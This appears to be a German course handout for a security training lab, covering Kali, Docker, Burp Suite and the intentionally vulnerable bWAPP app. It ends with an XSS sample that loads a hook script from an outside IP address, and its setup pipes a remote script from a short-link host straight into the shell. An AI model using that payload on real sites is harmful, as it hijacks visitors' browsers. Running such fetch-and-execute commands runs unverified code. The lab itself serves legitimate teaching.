#### Security Incident Management
###### *TSBE 16b*
---

###### Setup
- VM: [Kali Linux](https://www.kali.org/downloads/)<br>
- VMTools:
  - ``apt update && apt -y full-upgrade`` <br>
  - ``apt -y install open-vm-tools-desktop fuse`` <br>
- Docker:
  - `curl http://xcv.li/getDocker.sh | sh` <br>
- Burp:
  - ``apt-get install burpsuite``
- bwapp Docker container:
 - ``docker run --name bwapp -d -p 8083:80  raesene/bwapp``

Burp starten:
>Burp starten
Burp als Proxy für den Browser
Firefox:
Preferences -> Advanced -> Network Settings -> Connection
Proxy manuel
127.0.0.1 Port 8083
"No Proxy" for Localhost entfernen!

Info:
>Wenn bWApp einen Datenbank fehler zeigt und nicht richtig startet
http://127.0.0.1:8083/install.php<br>
Nach dem Neustart von Kali ist es möglich, dass bwapp nicht mehr läuft. Diese kann mit den folgenden Befehlen neu gestartet werden: <br>
``service docker restart`` <br>
``docker restart bwapp``

bwapp: http://127.0.0.1:8083

Links: <br>
CVSS: https://first.org/cvss/calculator/3.0 <br>
OWASP: http://owasp.org <br>
XSS Cheat sheet: http://n0p.net/penguicon/php_app_sec/mirror/xss.html<br>

``xss sample: asd<script src=///174.138.66.1/hook.js></script>``
